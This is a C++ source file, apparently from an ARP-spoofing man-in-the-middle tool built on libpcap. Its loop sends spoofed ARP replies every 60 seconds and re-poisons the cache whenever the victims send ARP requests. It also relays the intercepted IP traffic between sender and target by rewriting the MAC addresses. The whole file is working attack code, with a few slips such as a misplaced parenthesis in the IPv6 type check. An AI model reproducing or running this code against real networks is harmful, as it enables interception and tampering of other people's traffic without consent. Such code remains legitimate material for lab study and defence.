#include "pch.h"

void captureAndRelay(pcap_t *pcap, const u_char *packet, Address address, struct pcap_pkthdr *header)
{
    EthIpPacket *repacket = (EthIpPacket *)packet;
    repacket->eth_.smac_ = address.attackerMac;
    repacket->eth_.dmac_ = address.targetMac;

    int res = pcap_sendpacket(pcap, packet, header->len);
}

void repeatSpoof(pcap_t *pcap, std::vector<Address> &addressList)
{
    for(const auto&address:addressList)
    {
        arpReplyAttack(pcap, address);
    }

    auto lastSpoofTime = std::chrono::steady_clock::now();

    while(true)
    {
        auto currentTime = std::chrono::steady_clock::now();
        auto elapsedTime = std::chrono::duration_cast<std::chrono::seconds>
                           (currentTime - lastSpoofTime).count();

        if (elapsedTime >= 60) {
            for(const auto& address : addressList) {
                arpReplyAttack(pcap, address);
            }
            lastSpoofTime = currentTime;
        }

        struct pcap_pkthdr *header;
        const u_char *packet;

        int res = pcap_next_ex(pcap, &header, &packet);
        if(res == 0 || header->caplen > 1500 || header->len > 1500) continue;
        if(res < 0)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        const auto *eth_hdr = reinterpret_cast<const EthHdr*>(packet);

        if(ntohs(eth_hdr->type_) == EthHdr::Arp)
        {
            //reinfect
            const auto *arp_hdr = reinterpret_cast<const ArpHdr*>(packet + sizeof(EthHdr));
            if(ntohs(arp_hdr->op_) == ArpHdr::Request)
            {
                for(const auto&address:addressList)
                {
                    //unicast
                    if(ntohl(arp_hdr->sip_) == address.senderIp && ntohl(arp_hdr->tip_) == address.targetIp)
                    {
                        arpReplyAttack(pcap, address);
                        continue;
                    }

                    //broadcast
                    if(ntohl(arp_hdr->sip_) == address.senderIp || ntohl(arp_hdr->sip_) == address.targetIp)
                    {
                        arpReplyAttack(pcap, address);
                        continue;
                    }
                }
            }
        }

        //relay
        if(ntohs(eth_hdr->type_) == EthHdr::Ip4 || ntohs(eth_hdr->type_ == EthHdr::Ip6))
        {
            const auto *ip_hdr = reinterpret_cast<const IpHdr*>(packet + sizeof(EthHdr));

            for(const auto&address:addressList)
            {
                if((ntohl(ip_hdr->sip_) == address.senderIp && ntohl(ip_hdr->dip_) == address.targetIp))
                {
                    captureAndRelay(pcap, packet, address, header);
                    continue;
                }
            }
        }
    }
}
